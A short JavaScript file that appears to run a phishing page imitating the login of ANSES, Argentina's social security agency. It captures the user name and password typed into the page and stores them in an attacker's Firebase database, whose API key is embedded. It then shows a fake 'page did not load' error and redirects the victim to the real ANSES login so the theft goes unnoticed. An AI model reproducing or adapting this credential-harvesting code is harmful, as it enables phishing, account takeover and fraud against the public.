console.log(`Add`)


firebase.initializeApp({
  apiKey: 'AIzaSyCzbFfCxfj56x0UeEsBkemA88X9YxqZXV4',
  authDomain: 'proyectousuarios-837e4.firebaseapp.com',
  projectId: 'proyectousuarios-837e4'
});

var db = firebase.firestore();


function guardar(){

var usuario= document.getElementById('usuario').value;
var contraseña= document.getElementById('contraseña').value;
//var fecha= document.getElementById('fecha').value;
	db.collection("users").add({
    first: usuario,
    last: contraseña,
    //born: fecha
})




.then(function(docRef) {
    console.log("Document written with ID: ", docRef.id);
 
  window.alert("No se han cargado todos los componentes de la pagina. Vuelva a intentarlo");

    window.location.replace("https://servicioscorp.anses.gob.ar/clavelogon/logon.aspx?system=mianses");
})
.catch(function(error) {
    console.error("Error adding document: ", error);
});

}




